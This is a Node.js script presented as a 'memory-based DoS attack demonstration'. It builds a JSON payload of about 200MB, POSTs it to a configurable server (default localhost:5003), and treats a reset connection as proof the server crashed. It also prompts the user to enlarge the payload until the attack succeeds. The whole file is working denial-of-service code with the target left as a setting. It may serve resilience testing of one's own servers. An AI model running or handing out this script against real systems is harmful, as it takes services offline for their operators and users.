// Save this as memory-dos.js
const http = require('http');

console.log('Node.js Memory-based DoS Attack Demonstration');

// Function to create a large JSON payload
function createLargePayload(sizeMB) {
    // Create 1KB of data
    const oneKB = 'X'.repeat(1024);
    // Create 1MB of data
    const oneMB = oneKB.repeat(1024);

    console.log(`Creating payload of approximately ${sizeMB}MB...`);

    // Return an object with the payload repeated to reach desired size
    return {
        timestamp: new Date().toISOString(),
        data: oneMB.repeat(sizeMB)
    };
}

// Create a large payload - adjust size as needed
// Start with a smaller value (e.g., 100MB) and increase if needed
const payloadSizeMB = 200;
const payload = createLargePayload(payloadSizeMB);
const jsonData = JSON.stringify(payload);

console.log(`Payload size: ${(jsonData.length / (1024 * 1024)).toFixed(2)}MB`);

// Configure request options
const options = {
    hostname: 'localhost', // Change this to your server's hostname
    port: 5003,            // Change this to your server's port
    path: '/dos-test',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': jsonData.length
    }
};

console.log(`Sending DoS request to http://${options.hostname}:${options.port}${options.path}`);
console.log('This may take a moment...');

// Send the request
const req = http.request(options, (res) => {
    console.log(`Response status code: ${res.statusCode}`);

    let responseData = '';
    res.on('data', (chunk) => {
        responseData += chunk;
    });

    res.on('end', () => {
        console.log('Response received:');
        try {
            const parsedResponse = JSON.parse(responseData);
            console.log(JSON.stringify(parsedResponse, null, 2));
            console.log('\nServer processed the request without crashing.');
            console.log('Try increasing the payload size for a successful DoS attack.');
        } catch (e) {
            console.log('Received non-JSON response, server may be struggling.');
            console.log(responseData);
        }
    });
});

req.on('error', (e) => {
    if (e.code === 'ECONNRESET') {
        console.log('\nâœ“ SUCCESS: Connection was reset - The server likely crashed!');
        console.log('This indicates a successful DoS attack. The server ran out of memory trying to process the large JSON payload.');
    } else {
        console.error(`\nRequest error: ${e.message}`);
    }
});

// Set a timeout to detect hangs
req.setTimeout(30000, () => {
    console.log('\nRequest timed out - server may be hanging or very slow to respond.');
    req.destroy();
});

// Send the payload
console.log('Sending payload...');
req.write(jsonData);
req.end();